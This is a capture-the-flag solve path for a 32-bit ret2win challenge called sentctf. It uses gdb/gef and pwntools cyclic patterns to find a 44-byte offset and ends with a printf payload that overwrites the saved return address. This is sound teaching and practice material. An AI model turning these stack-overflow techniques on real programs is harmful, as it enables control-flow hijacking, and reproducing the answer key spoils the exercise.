## Intended Solve Path

1. Identify address of `sentctf()` function

```shell
$ gdb sentctf

gdb> info functions sentctf
0x08049186  sentctf
```

2. Identify offset between vulnerable buffer and $eip to overwrite

**METHOD 1: Directly using gdb stack analysis**

```shell
gef➤ disass vuln # disassemble vuln function
0x080491e8 <+55>:	nop
0x080491e9 <+56>:	mov    ebx,DWORD PTR [ebp-0x4]
0x080491ec <+59>:	leave
0x080491ed <+60>:	ret

gef➤ break *0x080491ed # break on ret
gef➤ run
Welcome to SENTCTF! Give me your input:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

gef➤ telescope -l -20 $esp
gef➤  telescope -l -20 $esp
...
0xffffcd4c│-0x0030: 0x080491bd  →  <vuln+000c> add ebx, 0x2e37
0xffffcd50│-0x002c: 0x61616161 # address of start of buffer
0xffffcd54│-0x0028: 0x61616161
0xffffcd58│-0x0024: 0x61616161
0xffffcd5c│-0x0020: 0x61616161
0xffffcd60│-0x001c: 0x61616161
0xffffcd64│-0x0018: 0x61616161
0xffffcd68│-0x0014: 0x61616161
0xffffcd6c│-0x0010: 0x61616161
0xffffcd70│-0x000c: 0x61616161
0xffffcd74│-0x0008: 0x61616161
0xffffcd78│-0x0004: 0x0a616161
0xffffcd7c│+0x0000: 0x08049225  →  <main+0037> mov eax, 0x0	 ← $esp # address of where $eip is saved

gef➤  p/d 0xffffcd7c - 0xffffcd50
44 # offset found

```

**METHOD 2: Use pwntools cyclic pattern**

```shell
$ pwn cyclic 64
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa

gdb sentctf

gef➤ break *0x080491ed # break on ret
gef➤ run
Welcome to SENTCTF! Give me your input:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa

gef➤ x/s $esp
0xffffcd7c:	"laaamaaanaaaoaaapaaa"


$ pwn cyclic -l laaamaaanaaaoaaapaaa
44 # offset found

```

3. Test exploit locally

```
printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x91\x04\x08' | ./ret2sentctf

```
